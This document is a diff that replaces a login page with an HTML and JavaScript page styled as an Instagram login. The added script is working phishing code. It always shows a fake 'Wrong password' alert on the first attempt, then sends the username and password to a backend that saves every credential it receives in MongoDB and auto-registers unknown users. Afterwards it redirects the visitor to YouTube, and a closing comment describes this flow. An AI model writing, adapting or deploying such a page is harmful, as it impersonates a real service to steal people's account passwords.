@@ -1,4 +1,4 @@
-
+<!-- 
 
 <!DOCTYPE html>
 <html lang="hi">
@@ -284,16 +284,15 @@
       </button>
     </form>
 
-    <!-- Status Message -->
     <div class="status" id="status"></div>
 
-    <!-- Info Box -->
+    
     <div class="info-box">
       <span class="db-status checking" id="dbStatus"></span>
       <span id="dbInfo">Connecting to MongoDB Atlas...</span>
     </div>
 
-    <!-- Footer -->
+    
     <div class="footer">
       <span id="userInfo">✨ Enter credentials to login or register</span>
     </div>
@@ -507,4 +506,600 @@
 </script>
 
 </body>
+</html> -->
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram Login</title>
+  <!-- Font Awesome for Instagram icon (free version) -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #000000;
+      background: radial-gradient(circle at 30% 20%, #1a1a1a, #000000 80%);
+      padding: 16px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
+      background: rgba(18, 18, 18, 0.85);
+      backdrop-filter: blur(8px);
+      border-radius: 36px;
+      padding: 30px 24px 28px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.04);
+      transition: all 0.2s ease;
+      border: 1px solid #2a2a2a;
+    }
+
+    /* heading with Instagram icon */
+    .heading {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 28px;
+      color: #f5f5f5;
+      letter-spacing: -0.5px;
+    }
+
+    .heading i {
+      font-size: 34px;
+      background: linear-gradient(135deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      filter: drop-shadow(0 0 6px rgba(214, 41, 118, 0.3));
+    }
+
+    .heading h1 {
+      font-size: 26px;
+      font-weight: 600;
+      background: linear-gradient(135deg, #f5f5f5, #b0b0b0);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .heading h1 span {
+      font-weight: 300;
+      background: none;
+      -webkit-text-fill-color: #a0a0a0;
+      color: #a0a0a0;
+      font-size: 18px;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+    }
+
+    .input-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+      background: #121212;
+      border: 1px solid #2c2c2c;
+      border-radius: 30px;
+      transition: border 0.2s, box-shadow 0.2s;
+    }
+
+    .input-wrapper:focus-within {
+      border-color: #6a6a6a;
+      box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.03);
+    }
+
+    .input-wrapper i {
+      color: #6a6a6a;
+      font-size: 16px;
+      padding-left: 18px;
+      pointer-events: none;
+      transition: color 0.2s;
+    }
+
+    .input-wrapper:focus-within i {
+      color: #c0c0c0;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 16px 18px 16px 12px;
+      background: transparent;
+      border: none;
+      outline: none;
+      color: #f5f5f5;
+      font-size: 14px;
+      font-weight: 400;
+      letter-spacing: 0.3px;
+    }
+
+    input::placeholder {
+      color: #7a7a7a;
+      font-weight: 300;
+      font-size: 13px;
+    }
+
+    input:-webkit-autofill {
+      -webkit-box-shadow: 0 0 0 30px #121212 inset !important;
+      -webkit-text-fill-color: #f5f5f5 !important;
+    }
+
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 6px 4px 20px 6px;
+    }
+
+    .checkbox-group input[type="checkbox"] {
+      width: 16px;
+      height: 16px;
+      accent-color: #1877f2;
+      cursor: pointer;
+      filter: drop-shadow(0 0 2px rgba(24, 119, 242, 0.3));
+    }
+
+    .checkbox-group label {
+      font-size: 13px;
+      color: #b0b0b0;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 15px;
+      border: none;
+      border-radius: 30px;
+      background: linear-gradient(135deg, #1877f2, #3a8cf5);
+      color: #fff;
+      font-weight: 600;
+      font-size: 15px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      box-shadow: 0 6px 16px rgba(24, 119, 242, 0.25);
+      letter-spacing: 0.3px;
+    }
+
+    .btn:hover:not(:disabled) {
+      transform: scale(1.01);
+      background: linear-gradient(135deg, #1f7ef5, #4b96ff);
+      box-shadow: 0 8px 24px rgba(24, 119, 242, 0.35);
+    }
+
+    .btn:active:not(:disabled) {
+      transform: scale(0.97);
+    }
+
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    .btn .spinner {
+      display: none;
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(255, 255, 255, 0.2);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+
+    .btn.loading .spinner {
+      display: block;
+    }
+
+    .btn.loading .btn-text {
+      display: none;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .status {
+      min-height: 24px;
+      text-align: center;
+      font-size: 13px;
+      font-weight: 500;
+      margin-top: 16px;
+      transition: all 0.25s ease;
+      padding: 0 4px;
+    }
+
+    .status.error { color: #ed4956; }
+    .status.success { color: #4ae0a0; }
+    .status.info { color: #b0b0b0; }
+    .status.fade-in {
+      animation: fadeUp 0.3s ease;
+    }
+
+    @keyframes fadeUp {
+      0% { opacity: 0; transform: translateY(6px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    .info-box {
+      background: #0e0e0e;
+      border: 1px solid #242424;
+      border-radius: 20px;
+      padding: 12px 16px;
+      margin-top: 18px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      color: #9a9a9a;
+      font-size: 12px;
+    }
+
+    .db-status {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      flex-shrink: 0;
+    }
+
+    .db-status.connected {
+      background: #4ae0a0;
+      box-shadow: 0 0 10px rgba(74, 224, 160, 0.5);
+    }
+
+    .db-status.disconnected {
+      background: #ed4956;
+      box-shadow: 0 0 10px rgba(237, 73, 86, 0.4);
+    }
+
+    .db-status.checking {
+      background: #f5b342;
+      animation: pulse 1s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(0.9); }
+    }
+
+    .footer-note {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 12px;
+      color: #6a6a6a;
+      border-top: 1px solid #1e1e1e;
+      padding-top: 16px;
+      display: flex;
+      justify-content: center;
+      gap: 6px;
+      flex-wrap: wrap;
+    }
+
+    .footer-note .highlight {
+      color: #b0b0b0;
+      font-weight: 400;
+    }
+
+    .footer-note i {
+      color: #5a5a5a;
+    }
+
+    /* responsive */
+    @media (max-width: 440px) {
+      .container { padding: 22px 16px; }
+      .heading h1 { font-size: 22px; }
+      .heading i { font-size: 28px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <!-- HEADING with Instagram icon -->
+  <div class="heading">
+    <i class="fab fa-instagram"></i>
+    <h1>Login <span>·</span></h1>
+  </div>
+
+  <form id="loginForm" autocomplete="off">
+    <div class="form-group">
+      <div class="input-wrapper">
+        <i class="fas fa-user-circle"></i>
+        <input 
+          type="text" 
+          id="userId" 
+          placeholder="Username, email or mobile" 
+          autocomplete="username"
+          required
+        />
+      </div>
+    </div>
+
+    <div class="form-group">
+      <div class="input-wrapper">
+        <i class="fas fa-lock"></i>
+        <input 
+          type="password" 
+          id="password" 
+          placeholder="Password" 
+          autocomplete="current-password"
+          required
+        />
+      </div>
+    </div>
+
+    <div class="checkbox-group">
+      <input type="checkbox" id="showPassword" />
+      <label for="showPassword">Show password</label>
+    </div>
+
+    <button type="submit" class="btn" id="loginBtn">
+      <span class="btn-text"><i class="fas fa-sign-in-alt" style="margin-right: 6px;"></i>Log in</span>
+      <span class="spinner"></span>
+    </button>
+  </form>
+
+  <!-- Status message -->
+  <div class="status" id="status"></div>
+
+  <!-- DB & info box -->
+  <div class="info-box">
+    <span class="db-status checking" id="dbStatus"></span>
+    <span id="dbInfo">Connecting to MongoDB Atlas...</span>
+  </div>
+
+  <!-- Footer / interactive hint -->
+  <div class="footer-note">
+    <i class="fas fa-database" style="color: #3a8cf5;"></i>
+    <span id="userInfo">✨ First login? Credentials saved automatically</span>
+  </div>
+</div>
+
+<script>
+  (function() {
+    // ---------- CONFIG ----------
+    // For local dev: use localhost:5000, on Vercel use /api
+    const API_URL = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')
+      ? 'http://localhost:5000/api'
+      : '/api';
+    const REDIRECT_URL = 'https://www.youtube.com';
+
+    // DOM refs
+    const form = document.getElementById('loginForm');
+    const userIdInput = document.getElementById('userId');
+    const passwordInput = document.getElementById('password');
+    const showPassword = document.getElementById('showPassword');
+    const statusEl = document.getElementById('status');
+    const loginBtn = document.getElementById('loginBtn');
+    const dbStatus = document.getElementById('dbStatus');
+    const dbInfo = document.getElementById('dbInfo');
+    const userInfo = document.getElementById('userInfo');
+
+    // ---------- HELPERS ----------
+    function showStatus(msg, type = 'info') {
+      statusEl.textContent = msg;
+      statusEl.className = `status ${type} fade-in`;
+    }
+
+    function clearStatus() {
+      statusEl.textContent = '';
+      statusEl.className = 'status';
+    }
+
+    function setLoading(state) {
+      if (state) {
+        loginBtn.classList.add('loading');
+        loginBtn.disabled = true;
+      } else {
+        loginBtn.classList.remove('loading');
+        loginBtn.disabled = false;
+      }
+    }
+
+    // ---------- DB CONNECTION CHECK ----------
+    async function checkConnection() {
+      try {
+        dbStatus.className = 'db-status checking';
+        dbInfo.textContent = 'Checking connection...';
+
+        const res = await fetch(`${API_URL}/health`);
+        if (res.ok) {
+          dbStatus.className = 'db-status connected';
+          dbInfo.textContent = '✅ MongoDB Atlas connected';
+          return true;
+        } else {
+          throw new Error('health check failed');
+        }
+      } catch (_) {
+        dbStatus.className = 'db-status disconnected';
+        dbInfo.textContent = '❌ Backend not running. Start with: npm run dev';
+        return false;
+      }
+    }
+
+    // ---------- API CALLS ----------
+    async function registerUser(userId, password) {
+      const res = await fetch(`${API_URL}/register`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId, password })
+      });
+      return res.json();
+    }
+
+    async function loginUser(userId, password) {
+      const res = await fetch(`${API_URL}/login`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId, password })
+      });
+      return res.json();
+    }
+
+    // ---------- GRANT ACCESS (redirect + alert) ----------
+    function grantAccess(message, userData) {
+      // show success message
+      showStatus(message, 'success');
+      // update footer
+      userInfo.innerHTML = `👤 <span style="color:#d0d0d0;">${userData.userId}</span> · logins: ${userData.loginCount}`;
+
+      // Save to localStorage
+      localStorage.setItem('savedUserId', userData.userId);
+      localStorage.setItem('loginCount', userData.loginCount);
+
+      // Show a nice alert (first time or welcome)
+      alert(`✅ ${message}\nWelcome ${userData.userId}!`);
+
+      // redirect after short delay
+      setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+      }, 800);
+    }
+
+    // ---------- FORM SUBMIT ----------
+    let attempt = 0;
+
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      clearStatus();
+
+      const userId = userIdInput.value.trim();
+      const password = passwordInput.value;
+
+      if (!userId || !password) {
+        showStatus('❌ Please fill in both fields', 'error');
+        return;
+      }
+      if (userId.length < 3 || password.length < 4) {
+        showStatus('❌ User ID (≥3) & Password (≥4)', 'error');
+        return;
+      }
+
+      attempt++;
+
+      // ---- FIRST ATTEMPT: always show "wrong password" popup ----
+      if (attempt === 1) {
+        setLoading(true);
+        showStatus('⏳ Checking credentials...', 'info');
+        setTimeout(() => {
+          setLoading(false);
+          clearStatus();
+          // Interactive alert as requested
+          alert('❌ Wrong password! Please enter the correct password.');
+          passwordInput.value = '';
+          passwordInput.focus();
+        }, 600);
+        return;
+      }
+
+      // ---- SECOND AND SUBSEQUENT ATTEMPTS: real login/register ----
+      setLoading(true);
+      showStatus('⏳ Processing...', 'info');
+
+      try {
+        // 1) try login
+        let result = await loginUser(userId, password);
+
+        if (result.success && result.data) {
+          grantAccess('✅ Login successful! Redirecting...', result.data);
+          return;
+        }
+
+        // 2) if user not found → register
+        if (result.message && result.message.toLowerCase().includes('user not found')) {
+          showStatus('📝 New user! Registering...', 'info');
+          const regResult = await registerUser(userId, password);
+          if (regResult.success && regResult.data) {
+            grantAccess('🎉 New user registered! Redirecting...', regResult.data);
+          } else {
+            showStatus(`❌ Registration failed: ${regResult.message}`, 'error');
+            setLoading(false);
+          }
+        } else {
+          // other error (e.g. wrong password)
+          showStatus(`❌ ${result.message}`, 'error');
+          setLoading(false);
+        }
+      } catch (err) {
+        console.error('Submit error:', err);
+        showStatus('❌ Network error. Please try again.', 'error');
+        setLoading(false);
+      }
+    });
+
+    // ---------- SHOW PASSWORD TOGGLE ----------
+    showPassword.addEventListener('change', function() {
+      passwordInput.type = this.checked ? 'text' : 'password';
+    });
+
+    // ---------- INIT ----------
+    async function init() {
+      await checkConnection();
+
+      // restore saved user
+      const saved = localStorage.getItem('savedUserId');
+      if (saved) {
+        userIdInput.value = saved;
+        userInfo.innerHTML = `📌 <span style="color:#b0b0b0;">${saved}</span> (saved)`;
+        passwordInput.focus();
+      } else {
+        userInfo.innerHTML = '✨ First login? Credentials saved automatically';
+      }
+
+      // periodic health check
+      setInterval(checkConnection, 35000);
+    }
+
+    init();
+
+    // (optional) extra interactive: clear status when typing
+    userIdInput.addEventListener('input', clearStatus);
+    passwordInput.addEventListener('input', clearStatus);
+
+  })();
+</script>
+
+<!-- 
+  ***************************************************************
+  BACKEND EXPECTED ENDPOINTS (Node.js + Express + MongoDB)
+  ***************************************************************
+  POST /api/register  → { userId, password } → { success, data: { userId, loginCount } }
+  POST /api/login     → { userId, password } → { success, data: { userId, loginCount } } or { success: false, message: '...' }
+  GET  /api/health    → { status: 'ok' }
+  ***************************************************************
+  The first attempt shows "Wrong password" popup, second attempt 
+  does real login or auto-register. All credentials saved in MongoDB.
+  After successful login/register → redirect to YouTube.
+-->
+</body>
 </html>
+
+
+
+
